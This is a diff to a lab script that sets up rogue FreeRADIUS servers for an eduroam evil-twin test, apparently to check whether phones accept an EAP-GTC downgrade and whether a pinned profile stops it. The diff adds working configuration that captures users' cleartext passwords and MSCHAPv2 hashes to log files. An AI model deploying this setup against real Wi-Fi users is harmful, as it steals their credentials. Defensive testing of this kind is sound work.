@@ -7,6 +7,7 @@
 #   legit        port 1812  Uni Wipkingen CA cert, pablo + gecko (VLAN 99, 60 s), both realms local
 #   attacker-b1  port 1814  Rogue CA cert (scene 2)
 #   attacker-b2  port 1816  Uni Wipkingen CA cert for onboard.gecko.ch only (scene 3)
+#   attacker-b3  port 1818  Rogue CA cert, offers EAP-GTC first (plaintext-harvest test)
 #
 # Run inside WSL from the repo: bash lab/eduroam/radius/setup-instances.sh
 set -euo pipefail
@@ -207,6 +208,17 @@ sed -i -E '0,/^post-auth \{/s//post-auth {\n\tgecko_copy_reply/' "$BASE/legit/si
 ATTACKER_USERS='fetch@gecko.ch	Cleartext-Password := "gecko"'
 build attacker-b1 radius-rogue rogue-ca "$RADIUS_SECRET_B" "$ATTACKER_USERS" 1814
 build attacker-b2 radius-b2 uni-wipkingen-ca "$RADIUS_SECRET_B" "$ATTACKER_USERS" 1816
+build attacker-b3 radius-rogue rogue-ca "$RADIUS_SECRET_B" "$ATTACKER_USERS" 1818
+
+# B3 offers EAP-GTC as the PEAP inner method instead of MSCHAPv2. GTC carries the
+# typed password in CLEARTEXT inside the tunnel, so a client that lets the server
+# downgrade the inner method hands over the plaintext password (no cracking).
+# This only tests whether the client PERMITS the downgrade - iOS/Android may
+# refuse, silently switch, or warn; that is exactly what we want to observe. The
+# MSCHAPv2 block is left in place, so a client that NAKs GTC falls back to
+# MSCHAPv2 and its hash is captured instead. With both overlays below, reading
+# captured-plain.log vs captured-hashes.log tells us what each OS actually did.
+sed -i -E 's/default_eap_type = mschapv2/default_eap_type = gtc/' "$BASE/attacker-b3/mods-enabled/eap"
 
 # --- attacker credential-harvesting overlay (lab only) ----------------------
 # Stock FreeRADIUS validates the inner MSCHAPv2 exchange and throws it away; it
@@ -217,7 +229,7 @@ build attacker-b2 radius-b2 uni-wipkingen-ca "$RADIUS_SECRET_B" "$ATTACKER_USERS
 # format. That capture is the HARM the GECKO path prevents: with a GECKO-pinned
 # profile the TLS tunnel never completes, so the client never sends a response
 # and nothing is ever written here. Read it with extract-hashes.sh.
-for atk in attacker-b1 attacker-b2; do
+for atk in attacker-b1 attacker-b2 attacker-b3; do
     adir="$BASE/$atk"
     cat > "$adir/mods-enabled/capture_hash" <<'EOF'
 # One NetNTLMv1/MSCHAPv2 line per captured login (lab only).
@@ -243,9 +255,39 @@ EOF
     sed -i -E '0,/Post-Auth-Type REJECT \{/s//Post-Auth-Type REJECT {\n\t\tcapture_mschap/' "$adir/sites-enabled/inner-tunnel"
 done
 
-for name in legit attacker-b1 attacker-b2; do
+# --- attacker B3 cleartext (EAP-GTC) overlay (lab only) ---------------------
+# With GTC the inner method is PAP-style: the password arrives as a cleartext
+# User-Password inside the tunnel, so the attacker reads it directly - no hash,
+# no offline cracking. This logs it to captured-plain.log. It fires only if the
+# client actually performed GTC, i.e. accepted the downgrade B3 offers. (If the
+# client NAKed GTC and fell back to MSCHAPv2, the hash overlay above caught that
+# in captured-hashes.log instead, so the two files together show the OS's choice.)
+b3dir="$BASE/attacker-b3"
+cat > "$b3dir/mods-enabled/capture_plain" <<'EOF'
+# One cleartext line per captured GTC login (lab only).
+linelog capture_plain {
+	filename = ${confdir}/captured-plain.log
+	permissions = 0644
+	format = "%{User-Name}:%{User-Password}"
+}
+EOF
+cat > "$b3dir/policy.d/capture_gtc" <<'EOF'
+# Capture the cleartext password of any identity that is not the public GECKO
+# onboarding identity, whenever a plaintext User-Password is present (GTC/PAP).
+capture_gtc {
+	if (&User-Name != "fetch@gecko.ch" && "%{User-Password}") {
+		capture_plain
+	}
+}
+EOF
+# Same two hooks as the hash overlay; both policies coexist (each is a no-op when
+# its attribute is absent), so B3 captures GTC cleartext and any MSCHAPv2 fallback.
+sed -i -E '0,/^post-auth \{/s//post-auth {\n\tcapture_gtc/' "$b3dir/sites-enabled/inner-tunnel"
+sed -i -E '0,/Post-Auth-Type REJECT \{/s//Post-Auth-Type REJECT {\n\t\tcapture_gtc/' "$b3dir/sites-enabled/inner-tunnel"
+
+for name in legit attacker-b1 attacker-b2 attacker-b3; do
     sudo freeradius -C -d "$BASE/$name" >/dev/null 2>&1 \
         && echo "$name: config OK" \
         || { echo "$name: config check FAILED; see: sudo freeradius -XC -d $BASE/$name" >&2; exit 1; }
 done
-echo "Instances in $BASE. Start one with lab/eduroam/radius/run.sh <legit|attacker-b1|attacker-b2>"
+echo "Instances in $BASE. Start one with lab/eduroam/radius/run.sh <legit|attacker-b1|attacker-b2|attacker-b3>"
